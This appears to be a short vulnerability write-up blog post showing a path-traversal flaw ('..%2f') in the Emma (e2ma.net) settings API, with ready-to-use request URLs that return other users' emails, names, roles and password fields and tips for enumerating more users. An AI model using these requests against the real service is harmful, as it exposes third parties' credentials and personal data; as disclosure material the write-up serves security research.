---
layout: post
title: Emma Users Information Leak via endpoint traversal
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - saltedfish</p>

## Step 1:

&nbsp;&nbsp;&nbsp;visit `https://settings.e2ma.net/` and login.

&nbsp;&nbsp;&nbsp;visit `https://settings.e2ma.net/api/user/..%2ftest1@root.com?fields=user_id,email,user_name_first,user_name_last,role,password` here is endpoint when you use `..%2f`,and you can visit other endpoint, this endpoint allowe get some information like email,passwrod,every sensitive data,So use `..%2f` can get other user information, like:

{% highlight php %}
https://settings.e2ma.net/api/user/..%2ftest1@root.com?fields=user_id,email,user_name_first,user_name_last,role,password

https://settings.e2ma.net/api/user/..%2ftest2@root.com?fields=user_id,email,user_name_first,user_name_last,role,password
{% endhighlight %}

&nbsp;&nbsp;&nbsp;I just only have two email,so I can give you two user information for this demo!You can change `test2@root.com` to a different email address and get other user information like username password.


<img src="https://i.loli.net/2019/05/09/5cd3e8fc1cd62.jpeg">


&nbsp;&nbsp;&nbsp;But then I found can get other user email address via this endpoint,and Just need change 1900932, You can get another user’s email address,you can get everything information about this user in this endpoint: `https://settings.e2ma.net/api/user/..%2ftest1@root.com?fields=user_id,email,user_name_first,user_name_last,role,password` here is endpoint when you use `..%2f`,and you can visit other endpoint,and this endpoint allowe get some information like email,passwrod,every sensitive data:


<img src="https://i.loli.net/2019/05/09/5cd3e8fc20656.jpeg">